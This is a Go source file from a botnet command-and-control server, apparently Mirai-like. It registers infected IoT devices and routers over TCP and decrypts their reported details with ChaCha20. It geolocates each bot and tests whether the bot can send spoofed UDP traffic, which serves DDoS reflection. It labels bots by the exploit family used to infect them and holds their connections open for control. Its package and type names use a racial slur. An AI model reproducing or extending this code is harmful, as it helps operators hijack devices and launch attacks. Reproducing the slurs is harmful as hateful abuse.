package slave_v2

import (
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/niggers/encryption"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strings"
	"time"
)

func ServeTCP() {
	tel, err := net.Listen("tcp", fmt.Sprintf(":%d", config.Slave.SlavePort))
	if err != nil {
		fmt.Println(err)
		return
	}

	config.Logger.Info("Listening for bot connections (TCP)", "port", config.Slave.SlavePort)

	for {
		conn, err := tel.Accept()
		if err != nil {
			continue
		}

		host, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
		if Slave.IsIPConnected(host) {
			conn.Close()
			continue
		}

		Slave.AddPending(host)
		go initialHandler(conn)
	}
}

func initialHandler(conn net.Conn) {
	host, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
	defer Slave.RemovePending(host)
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(30 * time.Second))

	buf := make([]byte, 4)
	l, err := conn.Read(buf)
	if err != nil || l != 4 {
		return
	}

	// 00 00 00 01 registration pattern
	if buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 && buf[3] > 0 {
		var arch = Read(conn, false)
		var version = Read(conn, false)

		if version == "d3d7595e" || version == "unk" {
			return
		}

		switch version {
		case "481c3fe":
			version = "1.9.7"
		case "d846cda1":
			version = "1.9.8"
		case "d3d7595e2":
			version = "1.9.9"
		}

		if !(version == "1.9.7" || version == "1.9.8") {
			var versionMatch = (version == "1.9.9")
			var cores = Read(conn, !versionMatch)
			var ram = Read(conn, !versionMatch)
			var source = Read(conn, !versionMatch)
			var root = Read(conn, !versionMatch)
			var spoofStr = Read(conn, !versionMatch)

			spoof := false
			if spoofStr != "" && spoofStr != "unk" && spoofStr != "0" {
				var spoofPort int
				fmt.Sscanf(spoofStr, "%d", &spoofPort)
				if spoofPort > 0 {
					addr := net.UDPAddr{Port: spoofPort, IP: net.ParseIP("0.0.0.0")}
					uconn, uerr := net.ListenUDP("udp", &addr)
					if uerr == nil {
						uconn.SetReadDeadline(time.Now().Add(3 * time.Second))
						buf := make([]byte, 1024)
						_, raddr, rerr := uconn.ReadFromUDP(buf)
						if rerr == nil && raddr != nil {
							if raddr.IP.String() == "5.5.5.5" {
								spoof = true
							}
						}
						uconn.Close()
					}
				}
			}

			Handle(conn, arch, version, strings.ToLower(source), cores, ram, root == "1", spoof)
			return
		}

		var source = Read(conn, false)
		Handle(conn, arch, version, strings.ToLower(source), "unk", "unk", false, false)
	}
}

func ReadByte(conn net.Conn, decrypt bool) byte {
	buf := make([]byte, 1)
	l, err := conn.Read(buf)
	if err != nil || l <= 0 {
		return 0
	}

	if decrypt {
		encryption.Chacha20(encryption.Key, 1, encryption.Nonce, buf, buf)
	}

	return buf[0]
}

func Read(conn net.Conn, decrypt bool) string {
	stringLen := make([]byte, 1)
	l, err := conn.Read(stringLen)
	if err != nil || l <= 0 {
		return ""
	}

	var source string
	if stringLen[0] > 0 {
		sourceBuf := make([]byte, stringLen[0])
		l, err := io.ReadFull(conn, sourceBuf)
		if err != nil || l <= 0 {
			return ""
		}

		if decrypt {
			encryption.Chacha20(encryption.Key, 1, encryption.Nonce, sourceBuf, sourceBuf)
		}

		source = string(sourceBuf)
	}

	if len(source) < 1 {
		source = "unk"
	}

	return source
}

func Handle(conn net.Conn, architecture, version, source, cores, ram string, root, spoof bool) {
	host, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
	country, iso, region := GetGeoInfo(host)
	client := &Nigger{
		Conn:       conn,
		Source:     source,
		Version:    version,
		Arch:       architecture,
		Cores:      cores,
		RAM:        ram,
		Country:    country,
		CountryISO: iso,
		Region:     region,
		Speedtest:  "",
		Root:       root,
		Spoof:      spoof,
	}

	client.Source = strings.ToLower(client.Source)

	// Mapping of source strings to corresponding client sources
	mapping := map[string]string{
		"goahead":   "smarttoaster",
		"dlink":     "smartwatch",
		"fiberrt":   "fiber",
		"avtech":    "avtech",
		"arm7":      "avtech",
		"c.":        "buttplug",
		"dvr":       "buttplug",
		"ipcam":     "buttplug",
		"r190w":     "cnpilot",
		"iphone":    "china",
		"gponfiber": "boa",
		"boa":       "boa",
		"gpon":      "boa",
		"nigger":    "fiber",
		"zhone":     "smartwatch",
		"weed":      "smartwatch",
		"baicells":  "smartwatch",
		"hongdian":  "smartwatch",
		"ruckus":    "smartwatch",
		"dm900":     "smartwatch",
		"lilin":     "buttplug",
		"jaws":      "smartwatch",
		"gozy":      "smartwatch",
		"utt":       "smartwatch",
		"gargoyle":  "smartwatch",
		"ruijie":    "smartwatch",
		"brr":       "brazil",
		"spain":     "buttplug",
		"cnr":       "boa",
		"asus":      "samsungfridge",
		"newzte":    "zte",
		"telecom":   "samsungfridge",
		"china":     "smartwatch",
		"wavlink":   "smartwatch",
		"webproc":   "smartwatch",
		"faith":     "smartwatch",
		"totolink":  "smartwatch",
	}

	for key, value := range mapping {
		if strings.Contains(source, key) {
			client.Source = value
		}
	}

	if len(client.Source) <= 1 {
		return
	}

	if client.Source == "e" {
		return
	}

	if client.Source == "teastick-telnet" {
		return
	}

	if client.Source == "teastick-lillin" {
		return
	}

	if strings.Contains(client.Source, "drag0n") {
		return
	}

	// Keep connection alive
	conn.SetDeadline(time.Time{})

	Slave.AddNigger(client)
	defer Slave.TerminateNigger(client)

	var length uint16
	for {
		conn.SetDeadline(time.Now().Add(180 * time.Second))
		err := binary.Read(conn, binary.BigEndian, &length)
		if err != nil {
			return
		}

		if length == 0 {
			// Ping-pong
			binary.Write(conn, binary.BigEndian, uint16(0))
			continue
		}

		if length > 2048 {
			return
		}

		payload := make([]byte, length)
		_, err = io.ReadFull(conn, payload)
		if err != nil {
			return
		}

		if payload[0] == 0x03 {
			client.Speedtest = string(payload[1:])
			continue
		}
	}
}
